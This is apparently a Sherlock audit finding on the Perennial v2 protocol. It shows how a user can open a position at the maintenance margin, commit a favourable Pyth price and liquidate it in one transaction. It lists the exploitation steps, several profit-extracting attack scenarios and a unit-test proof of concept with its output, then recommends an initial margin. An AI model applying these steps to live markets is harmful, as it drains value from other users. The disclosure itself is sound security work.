Wonderful Silver Loris

medium

# It is possible to open and liquidate your own position in 1 transaction to overcome efficiency and liquidity removal limits at almost no cost
## Summary

The way the protocol is setup, it is possible to open positions or withdraw collateral up to exactly maintenance limit (some percentage of notional). However, this means that it's possible to be at almost liquidation level intentionally and moreover, the current oracle setup allows to open and immediately liquidate your own position in 1 transaction, effectively bypassing efficiency and liquidity removal limits, paying only the keeper (and possible position open/close) fees, causing all kinds of malicious activity which can harm the protocol.

## Vulnerability Detail

The user can liquidate his own position with 100% guarantee in 1 transaction by following these steps:
1. It can be done on existing position or on a new position
2. Record Pyth oracle prices with signatures until you encounter a price which is higher (or lower, depending on your position direction) than latest oracle version price by any amount.
3. In 1 transaction do the following:
3.1. Make the position you want to liquidate at exactly the edge of liquidation: withdraw maximum allowed amount or open a new position with minimum allowed collateral
3.2. Commit non-requested oracle version with the price recorded earlier (this price makes the position liquidatable)
3.3. Liquidate your position (it will be allowed, because the position generates a minimum loss due to price change and becomes liquidatable)

Since all liquidation fee is given to user himself, liquidation of own position is almost free for the user (only the keeper and position open/close fee is paid if any).

## Impact

There are different malicious actions scenarios possible which can abuse this issue and overcome efficiency and liquidity removal limitations (as they're ignored when liquidating positions), such as:
- Open large maker and long or short position, then liquidate maker to cause mismatch between long/short and maker (socialize positions). This will cause some chaos in the market, disbalance between long and short profit/loss and users will probably start leaving such chaotic market, so while this attack is not totally free, it's cheap enough to drive users away from competition.
- Open large maker, wait for long and/or short positions from normal users to accumulate, then liquidate most of the large maker position, which will drive taker interest very high and remaining small maker position will be able to accumulate big profit with a small risk.
- Just open long/short position from different accounts and wait for the large price update and frontrun it by withdrawing max collateral from the position which will be in a loss, and immediately liquidate it in the same transaction: with large price update one position will be liquidated with bad debt while the other position will be in a large profit, total profit from both positions will be positive and basically risk-free, meaning it's at the expense of the other users. While this strategy is possible to do on its own, liquidation in the same transaction allows it to be more profitable and catch more opportunities, meaning more damage to the other protocol users.

The same core reason can also cause unsuspecting user to be unexpectedly liquidated in the following scenario:
1. User opens position (10 ETH long at $1000, with $10000 collateral). User is choosing very safe leverage = 1. Market maintenance is set to 20% (max leverage = 5)
2. Some time later the price is still $1000 and user decides to close most of his position and withdraw collateral, so he reduces his position to 2 ETH long and withdraws $8000 collateral, leaving his position with $2000 collateral. It appears that the user is at the safe leverage = 1 again.
3. Right in the same block the liquidator commits non-requested oracle with a price $999.999 and immediately liquidates the user.

The user is unsuspectedly liquidated even though he thought that he was at leverage = 1. But since collateral is withdrawn immediately, but position changes only later, user actually brought his position to max leverage and got liquidated. While this might be argued to be the expected behavior, it might still be hard to understand and unintuitive for many users, so it's better to prevent such situation from happening and the fix is the same as the one to fix self-liquidations.

## Proof of concept

The scenario of liquidating unsuspecting user is demonstrated in the test, add this to test/unit/market/Market.test.ts:
```solidity
it('panprog liquidate unsuspecting user / self in 1 transaction', async () => {

    function setupOracle(price: string, timestamp : number, nextTimestamp : number) {
        const oracleVersion = {
        price: parse6decimal(price),
        timestamp: timestamp,
        valid: true,
        }
        oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion)
        oracle.status.returns([oracleVersion, nextTimestamp])
        oracle.request.returns()
    }

    var riskParameter = {
        maintenance: parse6decimal('0.2'),
        takerFee: parse6decimal('0.00'),
        takerSkewFee: 0,
        takerImpactFee: 0,
        makerFee: parse6decimal('0.00'),
        makerImpactFee: 0,
        makerLimit: parse6decimal('1000'),
        efficiencyLimit: parse6decimal('0.2'),
        liquidationFee: parse6decimal('0.50'),
        minLiquidationFee: parse6decimal('10'),
        maxLiquidationFee: parse6decimal('1000'),
        utilizationCurve: {
        minRate: parse6decimal('0.0'),
        maxRate: parse6decimal('1.00'),
        targetRate: parse6decimal('0.10'),
        targetUtilization: parse6decimal('0.50'),
        },
        pController: {
        k: parse6decimal('40000'),
        max: parse6decimal('1.20'),
        },
        minMaintenance: parse6decimal('10'),
        virtualTaker: parse6decimal('0'),
        staleAfter: 14400,
        makerReceiveOnly: false,
    }
    var marketParameter = {
        fundingFee: parse6decimal('0.0'),
        interestFee: parse6decimal('0.0'),
        oracleFee: parse6decimal('0.0'),
        riskFee: parse6decimal('0.0'),
        positionFee: parse6decimal('0.0'),
        maxPendingGlobal: 5,
        maxPendingLocal: 3,
        settlementFee: parse6decimal('0'),
        makerRewardRate: parse6decimal('0'),
        longRewardRate: parse6decimal('0'),
        shortRewardRate: parse6decimal('0'),
        makerCloseAlways: false,
        takerCloseAlways: false,
        closed: false,
    }
        
    await market.connect(owner).updateRiskParameter(riskParameter);
    await market.connect(owner).updateParameter(marketParameter);

    setupOracle('100', TIMESTAMP, TIMESTAMP + 100);

    var collateral = parse6decimal('1000')
    dsu.transferFrom.whenCalledWith(userB.address, market.address, collateral.mul(1e12)).returns(true)
    await market.connect(userB).update(userB.address, parse6decimal('10.000'), 0, 0, collateral, false)

    var collateral = parse6decimal('100')
    dsu.transferFrom.whenCalledWith(user.address, market.address, collateral.mul(1e12)).returns(true)
    await market.connect(user).update(user.address, 0, parse6decimal('1.000'), 0, collateral, false)

    // settle
    setupOracle('100', TIMESTAMP + 100, TIMESTAMP + 200);
    await market.connect(userB).update(userB.address, parse6decimal('10.000'), 0, 0, 0, false)
    await market.connect(user).update(user.address, 0, parse6decimal('1.000'), 0, 0, false)

    // withdraw
    var collateral = parse6decimal('800')
    dsu.transfer.whenCalledWith(userB.address, collateral.mul(1e12)).returns(true)
    await market.connect(userB).update(userB.address, parse6decimal('2.000'), 0, 0, collateral.mul(-1), false)

    // liquidate unsuspecting user
    setupOracle('100.01', TIMESTAMP + 150, TIMESTAMP + 200);
    const EXPECTED_LIQUIDATION_FEE = parse6decimal('100.01')
    dsu.transfer.whenCalledWith(liquidator.address, EXPECTED_LIQUIDATION_FEE.mul(1e12)).returns(true)
    dsu.balanceOf.whenCalledWith(market.address).returns(COLLATERAL.mul(1e12))
    await market.connect(liquidator).update(userB.address, 0, 0, 0, EXPECTED_LIQUIDATION_FEE.mul(-1), true)

    setupOracle('100.01', TIMESTAMP + 200, TIMESTAMP + 300);
    await market.connect(userB).update(userB.address, 0, 0, 0, 0, false)

    var info = await market.locals(userB.address);
    var pos = await market.positions(userB.address);
    console.log("Liquidated maker: collateral = " + info.collateral + " maker = " + pos.maker);

})
```

Console output for the code:
```solidity
Liquidated maker: collateral = 99980000 maker = 0
```

Self liquidation is the same, just the liquidator does this in 1 transaction and is owned by userB.

## Code Snippet

Account solvency is calculated as meeting the minimum collateral of maintenance (percentage of notional):
https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/types/Position.sol#L305

It is possible to bring user to exactly the edge of liquidation, when minimum loss makes him liquidatable.

## Tool used

Manual Review

## Recommendation

Industry standard is to have initial margin (margin required to open position or withdraw collateral) and maintenance margin (margin required to keep the position solvent). Initial margin > maintenance margin and serves exactly for the reason to prevent users from being close to liquidation, intentional or not. I suggest to implement initial margin as a measure to prevent such self liquidation or unsuspected user liquidations. This will improve user experience (remove a lot of surprise liquidations) and will also improve security by disallowing intentional liquidations and cheaply overcoming the protocol limits such as efficiency limit: intentional liquidations are never good for the protocol as they're most often malicious, so having the ability to liquidate yourself in 1 transaction should definetely be prohibited.
